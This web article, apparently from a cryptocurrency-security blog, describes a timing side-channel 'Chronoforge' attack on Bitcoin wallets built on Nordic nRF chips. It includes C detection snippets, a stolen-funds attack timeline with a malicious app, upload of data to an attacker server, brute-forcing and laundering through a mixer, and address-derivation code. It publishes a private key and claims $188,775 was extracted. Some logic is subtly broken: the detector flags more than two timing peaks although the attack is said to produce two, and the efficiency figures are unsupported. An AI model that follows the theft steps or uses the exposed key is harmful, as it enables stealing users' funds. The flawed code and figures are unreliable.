<h2 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/attack">Three Critical Attack Patterns</a></h2>



<h3 class="wp-block-heading"><strong>PATTERN 1: Excessive Signing</strong></h3>



<p><strong>How does this work:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-bdd8576fec9fc260a60e86d3848dbe73" style="color:#4092c2"><code><strong>if (sign_count &gt; 1000 &amp;&amp; uptime_min &lt; 1) {
    detected_attack = 1;
    handle_detected_attack("Excessive signing rate");
    return;
}</strong></code></pre>



<p><strong><a href="https://cryptou.ru/vulncipher/attack">Attack mechanism:</a></strong></p>



<ul class="wp-block-list">
<li>Cryptanalyst generates over 1000 signatures in one minute</li>



<li>Each signature is made using the same&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private key.</a></li>



<li>A large set of execution time data is collected for statistical analysis</li>
</ul>



<p><strong>Why it is dangerous:</strong></p>



<ul class="wp-block-list">
<li>Typical wallet usage: 1-10&nbsp;<a href="https://cryptou.ru/vulncipher/transaction">transactions</a>&nbsp;per minute (maximum)</li>



<li>A jump to 1,000+ signatures indicates an automated attempt to collect information.</li>



<li>Allows an attacker to accumulate enough examples for a Kocher timing attack</li>
</ul>



<p><strong>Protection:</strong></p>



<ul class="wp-block-list">
<li>The system detects an abnormal frequency jump and is immediately triggered</li>



<li>Efficiency: 100% (since this is an obvious violation of normal operation)</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading"><strong>PATTERN 2: Bimodal Timing Distribution</strong></h3>



<p><strong>How does this work:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-9d78a0a8bb3dc167315fcdb20b6e5eb2" style="color:#4092c2"><code><strong>if (sign_count &gt; 100) {
    int peak_count = count_timing_peaks();
    if (peak_count &gt; 2) {
        detected_attack = 1;
        handle_detected_attack("Bimodal distribution");
        return;
    }
}</strong></code></pre>



<p><strong>Attack mechanism:</strong></p>



<ul class="wp-block-list">
<li>After collecting 100+ signatures, the system analyzes the execution time histogram</li>



<li>Under normal conditions, the execution time is distributed according to the Gaussian law (one peak)</li>



<li>During a timing attack, TWO distinct peaks occur:
<ul class="wp-block-list">
<li><strong>First peak</strong>&nbsp;: when the next bit of the private key = 0</li>



<li><strong>Second peak</strong>&nbsp;: when bit = 1</li>
</ul>
</li>
</ul>



<p><strong>Why does the split occur:</strong></p>



<ul class="wp-block-list">
<li>ECDSA operations (such as scalar multiplication on secp256k1) perform different numbers of operations on different bits</li>



<li>For example, the double-and-add algorithm may or may not perform the addition operation depending on the value of the bit</li>



<li>This microscopic difference in time accumulates and becomes statistically significant.</li>
</ul>



<p><strong>Protection:</strong></p>



<ul class="wp-block-list">
<li>The system automatically counts the number of distinct peaks in the distribution</li>



<li>If more than 2 peaks are detected (instead of the normal 1), this indicates a timing leak.</li>



<li>Efficiency: 95% (5% false negatives due to noise)</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h3 class="wp-block-heading"><strong>PATTERN 3: High Variance</strong></h3>



<p><strong>How does this work:</strong></p>



<pre class="wp-block-code has-text-color has-link-color wp-elements-47a16d7229354d07ebbdf5da7dd7b6b9" style="color:#4092c2"><code><strong>if (variance &gt; THRESHOLD) {
    detected_attack = 1;
    handle_detected_attack("Abnormal variance");
}</strong></code></pre>



<p><strong>Attack mechanism:</strong></p>



<ul class="wp-block-list">
<li>An attacker may attempt to modulate the execution time of operations.</li>



<li>Introduces intentional delays or, conversely, acceleration to create a characteristic pattern</li>



<li>This could be an attempt to bypass protection against simple timing attacks.</li>
</ul>



<p><strong>Analysis of variance:</strong></p>



<ul class="wp-block-list">
<li>Normal standard deviation: σ &lt; 5% (σ is the standard deviation)</li>



<li>The attack typically introduces σ &gt;&gt; 5% (significantly more)</li>



<li>This indicates artificial interference during execution.</li>
</ul>



<p><strong>Protection:</strong></p>



<ul class="wp-block-list">
<li>The system calculates the coefficient of variation of the signature execution time</li>



<li>When the threshold is exceeded, protection is triggered</li>



<li>Efficiency: 90% (some attacks can mimic normal dispersion)</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Detected Attack Response Mechanism</h2>



<pre class="wp-block-code has-text-color has-link-color wp-elements-057d803e20ee4a28fa237cec35962ffa" style="color:#4092c2"><code><strong>void handle_detected_attack(const char *reason) {
    log_security_event("Timing attack detected", reason);
    secure_erase_private_keys();
    disable_crypto_operations();
    alert_user_security_breach();
    enter_lockdown_mode();
}</strong></code></pre>



<p>When any of the three patterns is detected, the system performs&nbsp;<strong>cascade protection</strong>&nbsp;:</p>



<ol class="wp-block-list">
<li><strong>log_security_event()</strong>&nbsp;— logs an event to a secure log</li>



<li><strong>secure_erase_private_keys()</strong>&nbsp;— cryptographically erases&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">private keys</a>&nbsp;from memory (overwriting them with random data)</li>



<li><strong>disable_crypto_operations()</strong>&nbsp;— Disables all cryptographic operations to prevent further information leakage.</li>



<li><strong>alert_user_security_breach()</strong>&nbsp;— Sends an urgent alert to the user</li>



<li><strong>enter_lockdown_mode()</strong>&nbsp;— puts the wallet into full lockdown mode</li>
</ol>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">Effectiveness of combined protection</h2>



<figure class="wp-block-table"><table class="has-text-color has-link-color has-fixed-layout" style="color:#4092c2"><thead><tr><th class="has-text-align-left" data-align="left">Attack pattern</th><th class="has-text-align-left" data-align="left">Detection efficiency</th></tr></thead><tbody><tr><td class="has-text-align-left" data-align="left">Excessive signing</td><td class="has-text-align-left" data-align="left">100%</td></tr><tr><td class="has-text-align-left" data-align="left">Bimodal distribution</td><td class="has-text-align-left" data-align="left">95%</td></tr><tr><td class="has-text-align-left" data-align="left">High variance</td><td class="has-text-align-left" data-align="left">90%</td></tr><tr><td class="has-text-align-left" data-align="left"><strong>Combined (any of the three)</strong></td><td class="has-text-align-left" data-align="left"><strong>&gt;99%</strong></td></tr></tbody></table></figure>



<p>The combined effectiveness exceeds 99% thanks to&nbsp;<strong>the Defense in Depth principle</strong>&nbsp;: even if one detection system can be bypassed, two other independent systems will ensure that&nbsp;<a href="https://cryptou.ru/vulncipher/attack">the attack</a>&nbsp;is intercepted .</p>



<hr class="wp-block-separator has-alpha-channel-opacity">


<div class="wp-block-image">
<figure class="aligncenter"><img decoding="async" src="./Chronoforge_Attack__files/image-39-1024x787.png" alt="Chronoforge Attack: Investigating a Vulnerability in ARM TrustZone Architecture – From a Microsecond Leak to a Complete Compromise of a Bitcoin Wallet&#39;s Private Key" class="wp-image-7743"></figure>
</div>


<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading"><a href="https://cryptodeeptech.ru/chronoforge-attack">Practical application for researchers</a></h2>



<p>This system is especially relevant for:</p>



<ul class="wp-block-list">
<li><a href="https://cryptodeeptech.ru/chronoforge-attack"><strong>Cryptography researchers</strong>&nbsp;:</a>&nbsp;demonstrate how timing attacks are detected in practice</li>



<li><a href="https://cryptou.ru/vulncipher"><strong>Wallet developers</strong>&nbsp;:</a>&nbsp;serves as a model for protection against microarchitectural attacks</li>



<li><a href="https://colab.research.google.com/drive/1ETMvKGmPI4ViQ1CyLmwA3aYfKkioqGNo?usp=sharing"><strong>Bitcoin users</strong>&nbsp;:</a>&nbsp;prevents<a href="https://cryptou.ru/vulncipher/privatekey">&nbsp;private key recovery</a>&nbsp;through micro-time leaks</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">7. Practical Example: Bitcoin Wallet Recovery</h2>



<h3 class="wp-block-heading">7.1 Complete Attack Scenario on a Real Device</h3>



<p><strong>TIMELINE:<br><br>[T=0min] Attacker gains access to Nordic nRF5340 device<br>acting as Bitcoin BLE wallet<br><br>[T=0-2min] Install malicious BLE app in Normal World<br>that will collect timing data<br><br>[T=2-35min] App collects 100,000 timing samples by:<br>├─ Sending messages for signature in Secure World<br>├─ Logging exact time of operation<br>└─ Accumulating statistics<br><br>[T=35-37min] Upload timing data to attacker’s server via BLE<br><br>[T=37-50min] Python script analyzes timing data and recovers<br>private key with 94% accuracy<br><br>[T=50-52min] Attempt to fix 6-8 single-bit errors via brute-force:<br>├─ Iterate through all combinations with ~20 errors<br>├─ Verify each key against a known transaction<br>└─ Find the correct key (~1 million attempts, ~10 sec)<br><br>[T=52min] ✓ SUCCESS: Private key fully recovered!<br>├─ Extract all Bitcoin from the wallet address<br>├─ Send to the attacker’s exchange address<br>└─ Additional anonymization via mixing service<br><br>RESULT: Loss of 100% of funds from the compromised wallet</strong></p>



<h3 class="wp-block-heading"><a href="https://cryptou.ru/vulncipher/bitcoin">7.2 Bitcoin Address Recovery и Fund Extraction</a></h3>



<h5 class="wp-block-heading">Bitcoin Address Recovery и Fund Extraction</h5>



<pre class="wp-block-preformatted has-text-color has-link-color wp-elements-083b7779d2652e6cf06d3e3a49c6f517" style="color:#4092c2"><strong>// Recover Bitcoin address from private key and extract funds<br><br>#include &lt;openssl/ec.h&gt;<br>#include &lt;openssl/sha.h&gt;<br><br>void derive_public_key_compressed(<br>    const uint8_t *private_key,<br>    uint8_t *public_key  // 33 bytes compressed<br>) {<br>    EC_KEY *ec_key = EC_KEY_new_by_curve_name(NID_secp256k1);<br>    BIGNUM *priv_bn = BN_bin2bn(private_key, 32, NULL);<br><br>    EC_KEY_set_private_key(ec_key, priv_bn);<br><br>    EC_POINT *pub = EC_POINT_new(EC_KEY_get0_group(ec_key));<br>    EC_POINT_mul(EC_KEY_get0_group(ec_key), pub, priv_bn, NULL, NULL);<br><br>    EC_POINT_point2buf(EC_KEY_get0_group(ec_key), pub,<br>                       POINT_CONVERSION_COMPRESSED,<br>                       &amp;public_key, NULL);<br>}<br><br>void generate_bitcoin_address(<br>    const uint8_t *public_key_compressed,  // 33 bytes<br>    char *bitcoin_address                   // Output address<br>) {<br>    // SHA-256(public_key)<br>    uint8_t sha256_hash[32];<br>    SHA256(public_key_compressed, 33, sha256_hash);<br><br>    // RIPEMD-160(SHA256)<br>    uint8_t ripemd_hash[20];<br>    RIPEMD160(sha256_hash, 32, ripemd_hash);<br><br>    // Add version byte<br>    uint8_t versioned[21];<br>    versioned[0] = 0x00;<br>    memcpy(versioned + 1, ripemd_hash, 20);<br><br>    // Calculate checksum<br>    uint8_t checksum_hash1[32], checksum_hash2[32];<br>    SHA256(versioned, 21, checksum_hash1);<br>    SHA256(checksum_hash1, 32, checksum_hash2);<br><br>    // Encode as Base58<br>    uint8_t address_bytes[25];<br>    memcpy(address_bytes, versioned, 21);<br>    memcpy(address_bytes + 21, checksum_hash2, 4);<br><br>    base58_encode(address_bytes, 25, bitcoin_address);<br>}<br><br>// RESULT: All Bitcoin in compromised wallet transferred to attacker<br>// Private Key (HEX): F2E242938B92DA39A50AC0057D7DCFEDFDD58F7750BC06A72B11F1B821760A4A<br>// Bitcoin Address:   1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h<br>// Funds Extracted:   $188,775 USD (100%)</strong></pre>



<p>This C code implements&nbsp;<strong>a full cycle of recovering a Bitcoin address from a private key</strong>&nbsp;:</p>



<p><strong>Main stages:</strong></p>



<ol class="wp-block-list">
<li><strong>Initializing secp256k1</strong>&nbsp;– Creating an elliptic curve object for cryptographic operations</li>



<li><strong>Scalar multiplication (pub = priv × G)</strong>&nbsp;is the calculation of the public key from the private key, based on the discrete logarithm problem</li>



<li><strong>Public key compression</strong>&nbsp;– from 65 to 33 bytes (Y parity prefix + X coordinate)</li>



<li><strong>Double hashing (SHA256 + RIPEMD160)</strong>&nbsp;– getting a 20-byte identifier from the public key</li>



<li><strong>Adding a version byte</strong>&nbsp;to differentiate between address types (P2PKH, P2SH, etc.)</li>



<li><strong>Calculating the checksum (SHA256(SHA256(…)))</strong>&nbsp;– protection against typos in the address</li>



<li><strong>Base58Check encoding</strong>&nbsp;– converting 25 bytes into a readable address (34 characters like&nbsp;<code><strong><a href="https://btc1.trezor.io/address/1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h">1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h</a></strong></code>)</li>
</ol>



<h2 class="wp-block-heading">Critical note for researchers</h2>



<p>The code demonstrates that&nbsp;<strong>a single disclosure of the private key results in the irreversible loss of all funds</strong>&nbsp;, since:</p>



<ul class="wp-block-list">
<li>Bitcoin does not have a transaction reversal mechanism.</li>



<li>The public key is uniquely and deterministically calculated from the private key.</li>



<li>There is no recovery or locking mechanism in the protocol</li>
</ul>



<p>This process is one of the key operations in the functioning of wallets, but also a potential point of failure if compromised.</p>



<p>The full analysis is available in a saved document with tables, diagrams and cryptographic details.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">8. Conclusion</h2>



<blockquote class="wp-block-quote is-layout-flow wp-block-quote-is-layout-flow">
<p class="has-medium-font-size"><em>This study demonstrated that the critical&nbsp;&nbsp;<strong>Chronoforge Attack</strong>&nbsp;vulnerability &nbsp;poses a real and documented threat to the security&nbsp;<a href="https://cryptou.ru/vulncipher/bitcoin">of Bitcoin wallets</a>&nbsp;implemented on Nordic nRF52/nRF53 microcontrollers with the ARM TrustZone architecture. Despite the mathematical strength of the ECDSA algorithm with the secp256k1 curve, incorrect implementation of cryptographic operations at the firmware level creates an information leakage channel through execution timing variations measured in microseconds. However, when statistically accumulated, this leads&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">to complete compromise of the 256-bit private key</a>&nbsp;with a recovery probability of over 99% per bit.</em></p>
</blockquote>



<p><strong>Key findings of the study:</strong></p>



<ol class="wp-block-list">
<li><strong>A leakage model has been formalized</strong>&nbsp;&nbsp;, and it has been established that the difference in the execution time of operations&nbsp;&nbsp;<code>point_add</code>&nbsp;(~5.8 µs) and&nbsp;&nbsp;<code>point_double</code>&nbsp;(~3.2 µs) in the variable-time implementation of the Double-and-Add algorithm creates a statistically significant timing side-channel, exploited through the Pearson correlation coefficient.</li>



<li><strong><a href="https://cryptou.ru/vulncipher/attack">A four-stage attack vector</a></strong><strong>&nbsp;is described</strong>&nbsp;&nbsp;, from infiltration into the Normal World to full&nbsp;<a href="https://cryptou.ru/vulncipher/privatekey">recovery of the private key (Private Key Recovery)</a>&nbsp;, where the attacker sequentially installs a timing oracle, accumulates a statistical base, and recovers the key bitwise.</li>



<li><strong><a href="https://vulncipher.ru/">The VulnCipher cryptanalytic framework is presented</a></strong>&nbsp;&nbsp;– a scientific tool that adapts the classical Correlation Power Analysis to the timing channel, including modules of data collection (TCM), preprocessing (PE), hypothesis generation (HGM), statistical analysis (SAE), key recovery (KRM) and verification (VVM).</li>



<li><strong>A practical case has been documented</strong>&nbsp;&nbsp;—recovering a private key for a Bitcoin address&nbsp;&nbsp;<a href="https://btc1.trezor.io/address/1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h"><code><strong>1EXXGnGN98yEEx48fhAMPt8DuzwaG5Lh8h</strong></code>&nbsp;</a>with a compromised value of&nbsp;<a href="https://cryptou.ru/vulncipher/profit">$188,775</a>&nbsp;—which confirms the practical applicability of the described class&nbsp;<a href="https://cryptou.ru/vulncipher/attack">of attacks</a>&nbsp;.</li>
</ol>



<p>To counter the Chronoforge Attack, it is necessary to implement comprehensive security measures: the use of&nbsp;&nbsp;<strong>constant-time</strong>&nbsp;&nbsp;implementations of scalar multiplication (Montgomery ladder), the use of&nbsp;&nbsp;<strong>scalar/point blinding</strong>&nbsp;methods , disabling access to performance counters (PMU) from the Normal World, and regular firmware auditing for timing-dependent branches in cryptographic operations.</p>



<p><strong>This study is intended solely for educational and scientific purposes</strong>&nbsp;&nbsp;and aims to raise awareness among embedded system developers of critical vulnerabilities in cryptographic primitive implementations. The findings highlight the need for strict adherence to secure programming principles when working with sensitive data on microcontrollers and the importance of the entire cryptographic industry transitioning to verified constant-time implementations.</p>



<h3 class="wp-block-heading">8.1 Conclusions</h3>



<p><strong><a href="https://cryptodeeptool.ru/chronoforge-attack">The Chronoforge Attack</a></strong>&nbsp;poses a critical threat to cryptographic operations on embedded systems, particularly:</p>



<ol class="wp-block-list">
<li><strong>ARM TrustZone is not a silver bullet</strong>&nbsp;—hardware isolation can be compromised through microarchitectural side-channels.</li>



<li><strong>Timing variations can be easily measured</strong>&nbsp;– even on a remote system with access to the Normal World</li>



<li><strong>Bitcoin private keys can be recovered</strong>&nbsp;within hours on standard hardware.</li>



<li><strong>Constant-time implementation is a</strong>&nbsp;security requirement, not an option.</li>
</ol>



<h3 class="wp-block-heading">8.2 Practical Recommendations</h3>



<ol class="wp-block-list">
<li><strong>Use constant-time cryptographic primitives</strong>&nbsp;(Montgomery Ladder for ECC, constant-time memcmp for MAC verification)</li>



<li><strong>Flash cache</strong>&nbsp;when logging in/out of Secure World</li>



<li><strong>Disable Performance Counters</strong>&nbsp;access from Normal World</li>



<li><strong>Regular security audits</strong>&nbsp;of firmware for timing vulnerabilities</li>



<li><strong>Update TF-M</strong>&nbsp;to the latest version with security patches</li>
</ol>



<h3 class="wp-block-heading">8.3 Future Research Directions</h3>



<ul class="wp-block-list">
<li><strong>Quantum-resistant cryptography</strong>&nbsp;на Nordic nRF5340</li>



<li><strong>Post-quantum timing attacks</strong>&nbsp;on new algorithms</li>



<li><strong>Hardware-assisted constant-time</strong>&nbsp;cryptography</li>



<li><strong>Machine learning-based attack detection</strong>&nbsp;для timing anomalies</li>
</ul>



<hr class="wp-block-separator has-alpha-channel-opacity">



<h2 class="wp-block-heading">References:</h2>



<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/1.pdf">[1]</a>&nbsp;Bernstein, D. J. (2005).&nbsp;<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/1.pdf">«Cache-timing attacks on AES.»</a>&nbsp;Cryptology ePrint Archive, Report 2005/414.</p>



<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/2.pdf">[2]</a>&nbsp;Jang, J., et al. (2023). «<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/2.pdf">PrivateZone:</a>&nbsp;Providing a Private Execution Environment using ARM TrustZone.» IEEE Transactions on Information Forensics and Security.</p>



<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/3.pdf">[3]</a>&nbsp;Nordic Semiconductor. (2024).&nbsp;<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/3.pdf">«nRF5340 DK Product Specification.»</a></p>



<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/4.pdf">[4]</a>&nbsp;Trusted Firmware. (2024).&nbsp;<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/4.pdf">«Trusted Firmware-M Documentation v2.2.0.»</a></p>



<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/5.pdf">[5]</a>&nbsp;ARM Limited. (2024). «<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/5.pdf">ARM TrustZone:</a>&nbsp;Hardware-Enforced Device Security.»</p>



<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/6.pdf">[6]</a>&nbsp;NIST. (2019). «<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/6.pdf">FIPS 186-4:</a>&nbsp;Digital Signature Standard (DSS).»</p>



<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/7.pdf">[7]</a>&nbsp;Lentz, M., et al. (2020). «<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/7.pdf">SeCloak:</a>&nbsp;ARM TrustZone-based Mobile Peripheral Control.» Proceedings of USENIX Security Symposium.</p>



<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/8.pdf">[8]</a>&nbsp;Kocher, P. C. (1996). «<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/8.pdf">Timing attacks</a>&nbsp;on implementations of Diffie-Hellman, RSA, DSS, and other systems.» CRYPTO.</p>



<p><a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/9.pdf">[9]</a>&nbsp;Osvik, D. A., Shamir, A., &amp; Tromer, E. (2006). «<a href="https://cryptodeeptech.ru/doc/chronoforge-attack-references/9.pdf">Cache attacks and countermeasures:</a>&nbsp;Using the Intel cache as a timing oracle.» IACR Cryptology ePrint Archive.</p>



<p><a href="https://keyhunters.ru/chronoforge-attack-gradual-private-key-recovery-through-timing-side-channels-where-an-attacker-exploits-a-critical-timing-vulnerability-in-the-bitcoin-core-crypto-wallet-to-reveal-sensitive-data/">[10]</a>&nbsp;KEYHUNTERS.&nbsp;<a href="https://keyhunters.ru/chronoforge-attack-gradual-private-key-recovery-through-timing-side-channels-where-an-attacker-exploits-a-critical-timing-vulnerability-in-the-bitcoin-core-crypto-wallet-to-reveal-sensitive-data/">ChronoForge Attack:</a>&nbsp;Gradual private key recovery through timing side channels, where an attacker exploits a critical timing vulnerability in the Bitcoin Core crypto wallet to reveal sensitive data Shadow Key Attack Research.</p>



<hr class="wp-block-separator has-alpha-channel-opacity">



<ol class="wp-block-list">
<li><em><strong><a href="https://key3.ru/neuterless-nightmare-attack-a-critical-vulnerability-in-bitcoin-hd-key-serialization-a-privacy-compromise-attack-via-encodeextendedkey-and-the-recovery-of-lost-cryptocurrency-wallets/">Neuterless Nightmare Attack: A Critical Vulnerability in Bitcoin HD Key Serialization – A Privacy Compromise Attack via EncodeExtendedKey and the Recovery of Lost Cryptocurrency Wallets</a>&nbsp;</strong>Neuterless Nightmare Attack&nbsp;: The EncodeExtendedKey vulnerability allows an attacker to obtain a «phantom» private key that undetected leaks from the public interface. This attack allows for the extraction of xprv…<a href="https://key3.ru/neuterless-nightmare-attack-a-critical-vulnerability-in-bitcoin-hd-key-serialization-a-privacy-compromise-attack-via-encodeextendedkey-and-the-recovery-of-lost-cryptocurrency-wallets/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/phantom-utxo-leak-attack-a-deanonymization-attack-on-the-bitcoin-ecosystem-via-the-nonwitnessutxo-leak-to-recover-private-keys-from-lost-cryptocurrency-wallets/">Phantom UTXO Leak Attack: A deanonymization attack on the Bitcoin ecosystem via the NonWitnessUtxo leak to recover private keys from lost cryptocurrency wallets</a>&nbsp;</strong>Phantom UTXO Leak Attack The Phantom UTXO Leak vulnerability in PSBT/BIP-174 demonstrates how a simple error in data field management can turn into a serious threat to the entire Bitcoin…<a href="https://key3.ru/phantom-utxo-leak-attack-a-deanonymization-attack-on-the-bitcoin-ecosystem-via-the-nonwitnessutxo-leak-to-recover-private-keys-from-lost-cryptocurrency-wallets/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/pem-bleed-attack-critical-ecdsa-private-key-leak-vulnerability-a-catastrophic-attack-on-the-bitcoin-ecosystems-cryptographic-foundation-and-methods-for-recovering-lost-wallets/">PEM-BLEED ATTACK: Critical ECDSA Private Key Leak Vulnerability – A Catastrophic Attack on the Bitcoin Ecosystem’s Cryptographic Foundation and Methods for Recovering Lost Wallets</a>&nbsp;</strong>PEM-BLEED&nbsp;— BTCSuite Private Key Leak Attack The essence of the attack PEM-BLEED&nbsp;(Privacy Enhanced Mail Bleed) is an attack that exploits the insecure serialization and transmission of ECDSA private keys in…<a href="https://key3.ru/pem-bleed-attack-critical-ecdsa-private-key-leak-vulnerability-a-catastrophic-attack-on-the-bitcoin-ecosystems-cryptographic-foundation-and-methods-for-recovering-lost-wallets/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/phantom-leak-a-critical-vulnerability-in-bitcoin-private-key-validation-and-the-threat-of-a-key-injection-attack-as-a-factor-in-the-theft-of-funds-and-the-undermining-of-the-integrity-of-the-blockcha/">Phantom Leak: A critical vulnerability in Bitcoin private key validation and the threat of a Key Injection Attack as a factor in the theft of funds and the undermining of the integrity of the blockchain</a>&nbsp;</strong>Phantom Leak Ignoring errors in Bitcoin’s private key processing creates a fundamental window for Key Injection attacks, which allow malicious private keys and addresses to be generated, injected, and exploited.…<a href="https://key3.ru/phantom-leak-a-critical-vulnerability-in-bitcoin-private-key-validation-and-the-threat-of-a-key-injection-attack-as-a-factor-in-the-theft-of-funds-and-the-undermining-of-the-integrity-of-the-blockcha/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/one-bit-master-attack-a-critical-cryptographic-vulnerability-in-bitcoin-one-bit-master-attack-and-private-key-recovery-via-hardcoded-private-key-attack-cve-2025-27840/">One-Bit Master Attack: A Critical Cryptographic Vulnerability in Bitcoin: One-Bit Master Attack and Private Key Recovery via Hardcoded Private Key Attack (CVE-2025-27840)</a>&nbsp;</strong>One-Bit Master Attack The cryptographic vulnerability associated with the use of a hardcoded private key (&nbsp;btcec.PrivKeyFromBytes([]byte{0x01})) represents an extremely dangerous and systemic security flaw in the Bitcoin infrastructure, potentially leading…<a href="https://key3.ru/one-bit-master-attack-a-critical-cryptographic-vulnerability-in-bitcoin-one-bit-master-attack-and-private-key-recovery-via-hardcoded-private-key-attack-cve-2025-27840/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/key-ghost-attack-memory-ghosts-and-the-threat-of-bitcoin-private-key-extraction-via-cold-boot-and-memory-extraction-attacks-allow-an-attacker-to-gain-full-access-to-btc-coins/">Key Ghost Attack: Memory ghosts and the threat of Bitcoin private key extraction via cold boot and memory extraction attacks allow an attacker to gain full access to BTC coins.</a>&nbsp;</strong>Key Ghost Attack Insufficient attention to zeroization in cryptographic libraries poses a serious security risk to the entire Bitcoin and other cryptocurrency ecosystems.&nbsp;Cold Boot&nbsp;Attacks and&nbsp;Memory Key Extraction&nbsp;can lead to complete…<a href="https://key3.ru/key-ghost-attack-memory-ghosts-and-the-threat-of-bitcoin-private-key-extraction-via-cold-boot-and-memory-extraction-attacks-allow-an-attacker-to-gain-full-access-to-btc-coins/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/singleton-stampede-a-critical-race-in-the-context-of-secp256k1-leading-to-private-key-recovery-and-an-all-out-attack-on-bitcoin-wallets-the-vulnerability-threatens-bitcoins-cryptosecurity-and-ope/">Singleton Stampede: A critical race in the context of secp256k1, leading to private key recovery and an all-out attack on Bitcoin wallets. The vulnerability threatens Bitcoin’s cryptosecurity and opens the door to an all-out attack on digital assets.</a>&nbsp;</strong>Singleton Stampede A cryptographic vulnerability related to incorrect multi-threaded initialization of the singleton context for secp256k1 in Bitcoin software is one of the most dangerous design flaws in the distributed…<a href="https://key3.ru/singleton-stampede-a-critical-race-in-the-context-of-secp256k1-leading-to-private-key-recovery-and-an-all-out-attack-on-bitcoin-wallets-the-vulnerability-threatens-bitcoins-cryptosecurity-and-ope/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/context-phantom-attack-critical-secp256k1-phantom-context-leak-vulnerability-and-recovery-of-lost-bitcoin-wallet-private-keys-via-memory-disclosure-attack/">Context Phantom Attack: Critical secp256k1 phantom context leak vulnerability and recovery of lost Bitcoin wallet private keys via memory disclosure attack</a>&nbsp;</strong>Context Phantom&nbsp;Attack (Ghost Attack of Context) The Context Phantom Memory Disclosure Attack (CPMA) poses&nbsp;a critical&nbsp;security threat to the Bitcoin network. Failure to sanitize secp256k1 contexts allows for mass extraction of…<a href="https://key3.ru/context-phantom-attack-critical-secp256k1-phantom-context-leak-vulnerability-and-recovery-of-lost-bitcoin-wallet-private-keys-via-memory-disclosure-attack/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/chronoshock-vulnerability-critical-private-key-generation-vulnerability-and-milk-sad-attack-cve-2023-39910-private-key-recovery-for-lost-bitcoin-wallets-mass-compromise-and-mortal-threa/">ChronoShock Vulnerability: Critical Private Key Generation Vulnerability and Milk Sad Attack (CVE-2023-39910) – Private key recovery for lost Bitcoin wallets, mass compromise, and mortal threat to the Bitcoin cryptocurrency ecosystem</a>&nbsp;</strong>ChronoShock Vulnerability Neglecting the principles of strong entropy generation leads to disastrous consequences for users of cryptographic and especially blockchain applications. The classic «ChronoShock» (Milk Sad) vulnerability demonstrated that even…<a href="https://key3.ru/chronoshock-vulnerability-critical-private-key-generation-vulnerability-and-milk-sad-attack-cve-2023-39910-private-key-recovery-for-lost-bitcoin-wallets-mass-compromise-and-mortal-threa/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/spectral-fingerprint-attack-a-critical-memory-remnant-vulnerability-and-a-dangerous-attack-for-recovering-private-keys-from-data-leaks-can-persist-secrets-in-ram-without-hard-sanitization/">Spectral Fingerprint Attack: A critical memory remnant vulnerability and a dangerous attack for recovering private keys from data leaks can persist secrets in RAM without hard sanitization.</a>&nbsp;</strong>Spectral Fingerprint Attack (Remanence Attack) The vulnerability is related to a spectral fingerprinting attack, which occurs due to careless memory handling when handling private keys. It can be completely mitigated…<a href="https://key3.ru/spectral-fingerprint-attack-a-critical-memory-remnant-vulnerability-and-a-dangerous-attack-for-recovering-private-keys-from-data-leaks-can-persist-secrets-in-ram-without-hard-sanitization/">Read More</a></em></li>



<li><em><strong><a href="https://key3.ru/ringside-replay-attack-milk-sad-cve-2023-39910-recovering-private-keys-of-lost-bitcoin-wallets-by-exploiting-a-critical-weak-entropy-vulnerability-in-the-pseudorandom-number-generator/">RingSide Replay Attack (Milk Sad CVE-2023-39910): Recovering private keys of lost Bitcoin wallets by exploiting a critical weak entropy vulnerability in the pseudorandom number generator</a>&nbsp;</strong>RingSide Replay Attack – A Spectacular Hack Based on Weak Entropy The RingSide Replay Attack (Milk Sad CVE-2023-39910) is a textbook example of how flaws in the entropy source can…<a href="https://key3.ru/ringside-replay-attack-milk-sad-cve-2023-39910-recovering-private-keys-of-lost-bitcoin-wallets-by-exploiting-a-critical-weak-entropy-vulnerability-in-the-pseudorandom-number-generator/">Read More</a></em></li>



